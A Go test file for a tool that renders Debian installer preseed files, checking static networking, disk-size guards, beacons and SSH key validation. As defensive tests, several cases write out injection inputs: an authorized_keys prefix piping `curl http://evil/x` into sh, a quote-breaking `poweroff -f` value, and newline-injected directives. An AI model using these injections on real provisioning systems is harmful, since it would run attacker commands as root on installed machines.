package provision

import (
	"strings"
	"testing"
)

// testRunURL is the preseed/run URL every test below hands to
// RenderPreseed that isn't itself about that URL. It has the shape
// MediaHandler's /preseed/{name} route serves: the same 32-hex token as the
// preseed beside it, ".sh".
const testRunURL = "http://192.168.2.50:8081/preseed/0123456789abcdef0123456789abcdef.sh"

func goodSpec() Spec {
	return Spec{
		UID:      "b3f1c2d4-0000-4000-8000-000000000001",
		Hostname: "g9",
		Network: Network{
			Address: "192.168.2.210/24",
			Gateway: "192.168.2.254",
			DNS:     []string{"192.168.2.254"},
		},
		Layout: Layout{Kind: LayoutMirror, Disks: []Disk{
			{ByID: "/dev/disk/by-id/scsi-aaa", SizeBytes: 300 << 30},
			{ByID: "/dev/disk/by-id/scsi-bbb", SizeBytes: 300 << 30},
		}},
		SSHPublicKey: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILsytToxkJ2CiWuiv8BZ3hYpu7tFXn7Rwz+kc2gjbPSy frame-test-fixture",
		Cluster:      ClusterTarget{Mode: ClusterInit, K3sVersion: "v1.33.4+k3s1"},
	}
}

// The UID marker is what separates "this system came out of this image" from
// "something answers SSH at that address". Without it the installer's success
// signal is satisfied by the machine we believed we were overwriting and in
// fact never touched.
func TestRenderPreseedWritesTheUIDMarker(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "/etc/frame-install-uid") {
		t.Error("preseed does not write the marker file")
	}
	if !strings.Contains(got, "b3f1c2d4-0000-4000-8000-000000000001") {
		t.Error("preseed does not carry the UID")
	}
}

func TestRenderPreseedCarriesTheStaticNetwork(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"netcfg/disable_autoconfig boolean true",
		"netcfg/get_ipaddress string 192.168.2.210",
		"netcfg/get_netmask string 255.255.255.0",
		"netcfg/get_gateway string 192.168.2.254",
		"netcfg/get_hostname string g9",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("preseed missing %q", want)
		}
	}
}

// Decision 3 of the spec, made testable. The image is served over an
// unauthenticated HTTP path that any sandbox on the platform can reach.
//
// The fixture is a whole key file, not a bare PEM block, because a bare PEM
// fails to parse on its own and would prove nothing. Measured against
// golang.org/x/crypto/ssh: ParseAuthorizedKey returns no error for a valid
// public line followed by a private one, and none for the reverse order
// either. That is the shape a real leak takes -- a Secret whose id.pub holds
// both halves, or a paste of `cat id_ed25519*`.
func TestRenderPreseedRefusesAWholeKeyFile(t *testing.T) {
	const privatePart = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU=\n-----END OPENSSH PRIVATE KEY-----"
	pub := goodSpec().SSHPublicKey

	for name, key := range map[string]string{
		"public then private": pub + "\n" + privatePart,
		"private then public": privatePart + "\n" + pub,
		// No PEM armour anywhere in this one, on purpose. The other two cases
		// are refused by the PRIVATE KEY branch *and* by the single-line rule,
		// so neither of them can isolate either guard. This one carries no
		// secret at all -- it is someone appending a second person's key
		// instead of replacing the first -- and only the single-line rule
		// refuses it. It is what makes that rule provable.
		"two public keys, one per line": pub + "\n" + pub,
	} {
		s := goodSpec()
		s.SSHPublicKey = key
		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
			t.Errorf("%s: a value carrying private key material was accepted", name)
		}
	}
}

// The dedicated branch earns its place by what it says, so that is what this
// asserts. Remove the branch and the value is still refused -- by the
// single-line rule -- but the message stops naming the problem.
func TestRenderPreseedSaysSoWhenTheValueIsPrivateKeyMaterial(t *testing.T) {
	s := goodSpec()
	s.SSHPublicKey = s.SSHPublicKey + "\n-----BEGIN OPENSSH PRIVATE KEY-----"
	_, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
	if err == nil {
		t.Fatal("want an error, got nil")
	}
	if !strings.Contains(err.Error(), "private key material") {
		t.Errorf("error = %q; it must name the problem, not just refuse", err)
	}
}

// The key is interpolated into a single-quoted shell word in late_command, so
// a quote in the comment field ends that word and the rest runs as root on the
// machine being installed. ParseAuthorizedKey accepts such a line without
// complaint -- measured.
func TestRenderPreseedRefusesAKeyThatCouldBreakOutOfThePreseedShell(t *testing.T) {
	for _, comment := range []string{"don't", `back\slash`} {
		s := goodSpec()
		s.SSHPublicKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILsytToxkJ2CiWuiv8BZ3hYpu7tFXn7Rwz+kc2gjbPSy " + comment
		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
			t.Errorf("comment %q was accepted; it breaks out of the shell quoting", comment)
		}
	}
}

// Two keys on one line do not land where anyone would look for them. The
// parser takes the first and folds the entire second key into the first one's
// comment field, leaving its trailing remainder empty -- measured -- so the
// obvious check (is there anything left over?) is blind to exactly this case.
func TestRenderPreseedRefusesASecondKeyHiddenInTheCommentField(t *testing.T) {
	s := goodSpec()
	s.SSHPublicKey = s.SSHPublicKey + " " + s.SSHPublicKey
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("two keys on one line were accepted")
	}
}

func TestRenderPreseedRefusesAValueTooLongToBeAKey(t *testing.T) {
	s := goodSpec()
	s.SSHPublicKey = s.SSHPublicKey + " " + strings.Repeat("x", 1024)
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("a 1100-character value was accepted")
	}
}

func TestRenderPreseedRefusesAKeyThatIsNotAnAuthorizedKeysLine(t *testing.T) {
	s := goodSpec()
	s.SSHPublicKey = "hunter2"
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a non-key, got nil")
	}
}

// The options prefix is "something else in the value" that ParseAuthorizedKey
// accepts without complaint -- measured: command="curl .. |sh",no-pty parses
// cleanly, and the double quotes inside it are inert in the single-quoted
// echo that writes this file, so the metacharacter check never sees it. If
// this key were accepted, the command would run as Frame's own login,
// "frame", who has NOPASSWD:ALL.
func TestRenderPreseedRefusesAKeyWithAuthorizedKeysOptions(t *testing.T) {
	s := goodSpec()
	s.SSHPublicKey = `command="curl http://evil/x|sh",no-pty ` + s.SSHPublicKey
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a key carrying authorized_keys options, got nil")
	}
}

// The join token belongs to the cluster, not to the image. If it ever reaches
// RenderPreseed it must not come out the other side.
func TestRenderPreseedNeverEmitsTheJoinToken(t *testing.T) {
	s := goodSpec()
	s.Cluster = ClusterTarget{Mode: ClusterJoin, ServerURL: "https://192.168.2.201:6443", JoinToken: "K10SECRETTOKEN", K3sVersion: "v1.33.4+k3s1"}
	got, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "K10SECRETTOKEN") {
		t.Fatal("the join token is in the preseed")
	}
}

// The installer refuses on the machine if the named disk is not the size Frame
// was told it is.
func TestRenderPreseedAssertsDiskSizeBeforePartitioning(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "blockdev --getsize64 /dev/disk/by-id/scsi-aaa") {
		t.Error("preseed does not assert the disk size")
	}
	if !strings.Contains(got, "preseed/early_command") {
		t.Error("the assertion must run before partman, in early_command")
	}
	// Whether a non-zero early_command aborts the install could not be
	// verified here, so the assertion does not depend on it: on a mismatch it
	// powers the machine off directly. An untouched, powered-off machine is a
	// safe failure.
	if !strings.Contains(got, "poweroff -f") {
		t.Error("on a size mismatch the machine must power off, not rely on early_command's exit-code semantics")
	}
}

func TestRenderPreseedRejectsAnEmptyUID(t *testing.T) {
	s := goodSpec()
	s.UID = ""
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for empty UID, got nil")
	}
}

func TestRenderPreseedRejectsAnEmptyHostname(t *testing.T) {
	s := goodSpec()
	s.Hostname = ""
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for empty hostname, got nil")
	}
}

func TestRenderPreseedRejectsAMalformedNetworkAddress(t *testing.T) {
	s := goodSpec()
	s.Network.Address = "not-a-cidr"
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a malformed network address, got nil")
	}
}

// A CIDR is not the same shape as an IP address. net.ParseCIDR happily
// accepts an IPv6 range, and rendering its mask as a dotted quad produces
// nonsense like "ffff:ffff:ffff:ffff::" for netcfg/get_netmask.
func TestRenderPreseedRejectsANonIPv4Address(t *testing.T) {
	s := goodSpec()
	s.Network.Address = "2001:db8::1/64"
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a non-IPv4 network address, got nil")
	}
}

func TestRenderPreseedRejectsAMalformedGateway(t *testing.T) {
	s := goodSpec()
	s.Network.Gateway = "not-an-ip"
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a malformed gateway, got nil")
	}
}

// checkPreseedValue is one function shared by every field that reaches the
// template (UID, Hostname, DNS, Network.Address, Network.Gateway, Layout.Raw,
// Disk.ByID) rather than a guard per field -- a guard per field is exactly
// what failed for four rounds on SSHPublicKey while these fields, reaching
// the same two contexts, had none. Hostname stands in for all of them here:
// the function does not vary by call site, so one covering test per branch is
// enough to mutation-prove the shared code, not one per field.
func TestRenderPreseedRefusesAHostnameContainingANewline(t *testing.T) {
	s := goodSpec()
	s.Hostname = "g9\nd-i partman/confirm boolean true"
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a hostname containing a newline, got nil")
	}
}

// The newline branch is not what closes the hole for this field: \n and \r
// are themselves control characters (0x0A and 0x0D), so the control-character
// loop below already refuses them -- measured, disabling the newline branch
// alone does not turn TestRenderPreseedRefusesAHostnameContainingANewline red.
// It earns its place the same way the PRIVATE KEY branch in
// checkPublicKeyOnly does: for what it says. "starts a new directive, which
// runs as root" is far more specific than "must not contain control
// characters", so this asserts the message rather than merely the error.
func TestRenderPreseedNamesTheNewlineWhenAValueBreaksADirective(t *testing.T) {
	s := goodSpec()
	s.Hostname = "g9\nd-i partman/confirm boolean true"
	_, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
	if err == nil {
		t.Fatal("want an error, got nil")
	}
	if !strings.Contains(err.Error(), "starts a new directive") {
		t.Errorf("error = %q; it must name the problem, not just refuse", err)
	}
}

func TestRenderPreseedRefusesAHostnameContainingAQuoteOrBackslash(t *testing.T) {
	for _, h := range []string{"g9'", `g9\`} {
		s := goodSpec()
		s.Hostname = h
		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
			t.Errorf("hostname %q was accepted; it breaks out of the shell quoting elsewhere in the preseed", h)
		}
	}
}

func TestRenderPreseedRefusesAHostnameContainingControlCharacters(t *testing.T) {
	s := goodSpec()
	s.Hostname = "g9\x00"
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("want error for a hostname containing a control character, got nil")
	}
}

// C1. The static-network block above this directive is inert on its own:
// with url= preseeding, netcfg has already run over DHCP before this file
// could be fetched at all. Without preseed/run the machine installs, comes
// up on its DHCP address under a DHCP name, and Frame waits at an address
// nobody is on -- after wiping every named disk.
func TestRenderPreseedRunsNetcfgAgainAfterTheFileIsLoaded(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	want := "d-i preseed/run string " + testRunURL
	if !strings.Contains(got, want) {
		t.Errorf("preseed does not carry %q, so every netcfg answer in it is inert:\n%s", want, got)
	}
}

// The positive control for the test above: it proves the assertion is
// looking at a value that actually varies with the argument, not at a
// constant that would match whatever was passed.
func TestRenderPreseedCarriesTheRunURLItWasGivenNotAFixedOne(t *testing.T) {
	other := "http://10.0.0.1:9999/preseed/ffffffffffffffffffffffffffffffff.sh"
	got, err := RenderPreseed(goodSpec(), other, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "d-i preseed/run string "+other) {
		t.Errorf("preseed does not carry the run URL it was given")
	}
	if strings.Contains(got, testRunURL) {
		t.Errorf("preseed carries a run URL nobody passed it")
	}
}

func TestRenderPreseedRefusesAnEmptyRunScriptURL(t *testing.T) {
	if _, err := RenderPreseed(goodSpec(), "  ", "", testBeaconToken); err == nil {
		t.Fatal("an empty preseed/run URL was accepted; the static network configuration would be inert")
	}
}

func TestRenderPreseedRefusesARunScriptURLThatWouldBreakTheDirective(t *testing.T) {
	if _, err := RenderPreseed(goodSpec(), "http://x/a.sh\nd-i foo/bar string baz", "", testBeaconToken); err == nil {
		t.Fatal("a run URL carrying a newline was accepted; in a preseed that starts a new directive")
	}
}

// Debian: "any hostname and domain names assigned from dhcp take precedence
// over values set here". netcfg/hostname is the documented force knob and
// it is set -- but that only holds if the netcfg re-run above happens, and
// that is unproven without hardware. This writes the name into the
// installed system directly, where in-target already runs, so the node's
// name does not depend on an unobserved ordering.
func TestRenderPreseedWritesTheHostnameOntoTheInstalledSystem(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "echo 'g9' > /target/etc/hostname") {
		t.Errorf("preseed's late_command does not write /etc/hostname, so the node name depends on DHCP:\n%s", got)
	}
	if !strings.Contains(got, "d-i netcfg/hostname string g9") {
		t.Errorf("preseed does not set netcfg/hostname, the knob that overrides a DHCP-supplied name")
	}
}

func TestRenderPreseedRefusesADNSEntryThatIsNotAnIP(t *testing.T) {
	s := goodSpec()
	s.Network.DNS = []string{"192.168.2.254", "resolver.example.com"}
	if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
		t.Fatal("a DNS entry that is not an IP address was accepted")
	}
}

func TestRenderPreseedAcceptsAResolverListOfIPs(t *testing.T) {
	s := goodSpec()
	s.Network.DNS = []string{"192.168.2.254", "9.9.9.9"}
	got, err := RenderPreseed(s, testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(got, "netcfg/get_nameservers string 192.168.2.254 9.9.9.9") {
		t.Errorf("preseed does not carry both resolvers:\n%s", got)
	}
}

// A machine installed with no resolver renders
// "d-i netcfg/get_nameservers string " -- empty -- against a mirror named
// deb.debian.org. partman runs before the base system is fetched, so the
// install halts at critical priority asking a question nobody is there to
// answer, AFTER both disks are gone, and Frame sees only the sixty-minute
// Installing timeout. The console's own happy path built exactly this,
// because its dialog had no DNS field.
func TestRenderPreseedRefusesANetworkWithNoResolver(t *testing.T) {
	for name, dns := range map[string][]string{
		"nil":   nil,
		"empty": {},
	} {
		s := goodSpec()
		s.Network.DNS = dns
		if _, err := RenderPreseed(s, testRunURL, "", testBeaconToken); err == nil {
			t.Errorf("%s resolver list was accepted; the install would halt after wiping every named disk", name)
		}
	}
}

// And the refusal is in ValidateSpec, so it lands wherever a Spec is
// checked -- including Install's Pending phase, before the BMC is read at
// all, not only at Preparing where the image is built.
func TestValidateSpecRefusesANetworkWithNoResolver(t *testing.T) {
	s := goodSpec()
	s.Network.DNS = nil
	if err := ValidateSpec(s); err == nil {
		t.Fatal("ValidateSpec accepted a spec with no resolver")
	}
	// Positive control: the same spec with a resolver passes, so the
	// refusal above is about DNS and not about the fixture being broken.
	if err := ValidateSpec(goodSpec()); err != nil {
		t.Fatalf("a good spec was refused: %v", err)
	}
}

// The four checkpoints have to be in the rendered file, at the right
// commands: a checkpoint emitted from the wrong hook reports a stage the
// installer has not reached.
func TestRenderPreseedEmitsEveryCheckpointAtItsOwnHook(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range []struct{ directive, checkpoint string }{
		{"preseed/early_command", CheckpointEarly},
		{"partman/early_command", CheckpointPartman},
		{"preseed/late_command", CheckpointLate},
	} {
		line := directiveLine(t, got, c.directive)
		if !strings.Contains(line, BeaconURL(testBeaconBase, testBeaconToken, c.checkpoint)) {
			t.Errorf("%s does not report checkpoint %q:\n%s", c.directive, c.checkpoint, line)
		}
	}
}

// This is what makes the size guard legible. `early` must be emitted after
// the assertion, so a machine that refused carries `netcfg` and nothing
// more -- an outcome no other failure produces.
func TestRenderPreseedReportsEarlyOnlyAfterTheDiskAssertion(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	line := directiveLine(t, got, "preseed/early_command")
	assertion := strings.Index(line, "poweroff -f")
	beacon := strings.Index(line, BeaconURL(testBeaconBase, testBeaconToken, CheckpointEarly))
	if assertion < 0 || beacon < 0 {
		t.Fatalf("early_command is missing the assertion or the beacon:\n%s", line)
	}
	if beacon < assertion {
		t.Errorf("the early beacon is emitted before the disk assertion, so a refused machine would look like it passed:\n%s", line)
	}
}

func TestRenderPreseedStartsTheHeartbeat(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	line := directiveLine(t, got, "preseed/early_command")
	if !strings.Contains(line, "sleep 15") || !strings.Contains(line, "while true") {
		t.Errorf("early_command does not start a heartbeat loop:\n%s", line)
	}
}

// A beacon must never be the reason an installation stops.
func TestRenderPreseedNeverLetsABeaconFailTheInstall(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, testBeaconBase, testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(got, "\n") {
		if !strings.Contains(line, "/beacon/") {
			continue
		}
		if !strings.Contains(line, "|| true") {
			t.Errorf("a beacon line has no `|| true`:\n%s", line)
		}
	}
}

// The cold-start path passes no base. Not "a base that goes nowhere": none.
func TestRenderPreseedWithNoBeaconBaseEmitsNoBeacons(t *testing.T) {
	got, err := RenderPreseed(goodSpec(), testRunURL, "", testBeaconToken)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(got, "/beacon/") {
		t.Errorf("a preseed rendered with no beacon base still carries beacon URLs:\n%s", got)
	}
}

func TestRenderPreseedRefusesABeaconBaseThatWouldBreakTheDirective(t *testing.T) {
	for _, bad := range []string{"http://x\nd-i foo/bar string baz", "http://x'; poweroff -f; '"} {
		if _, err := RenderPreseed(goodSpec(), testRunURL, bad, testBeaconToken); err == nil {
			t.Errorf("RenderPreseed accepted beacon base %q", bad)
		}
	}
}

func TestRenderRunScriptReportsNetcfgAndStillRerunsNetcfg(t *testing.T) {
	got := RenderRunScript(testBeaconBase, testBeaconToken)
	for _, want := range []string{"kill-all-dhcp", "\nnetcfg", BeaconURL(testBeaconBase, testBeaconToken, CheckpointNetcfg)} {
		if !strings.Contains(got, want) {
			t.Errorf("the preseed/run script does not contain %q:\n%s", want, got)
		}
	}
	if !strings.HasPrefix(got, "#!/bin/sh\n") {
		t.Errorf("the preseed/run script has no interpreter line:\n%s", got)
	}
	if strings.Index(got, "kill-all-dhcp") > strings.Index(got, "\nnetcfg") {
		t.Error("the script runs netcfg before killing the DHCP client")
	}
	if bare := RenderRunScript("", testBeaconToken); strings.Contains(bare, "/beacon/") {
		t.Errorf("a run script rendered with no beacon base carries a beacon URL:\n%s", bare)
	}
}

// directiveLine returns the logical preseed line for a directive, joining
// the backslash continuations d-i uses for multi-command hooks. Without the
// join, a test searching for two strings "on the same line" would pass or
// fail on where the template happens to wrap.
func directiveLine(t *testing.T, preseed, directive string) string {
	t.Helper()
	joined := strings.ReplaceAll(preseed, "\\\n", " ")
	for _, line := range strings.Split(joined, "\n") {
		if strings.Contains(line, directive) {
			return line
		}
	}
	t.Fatalf("no %s directive in the rendered preseed:\n%s", directive, preseed)
	return ""
}
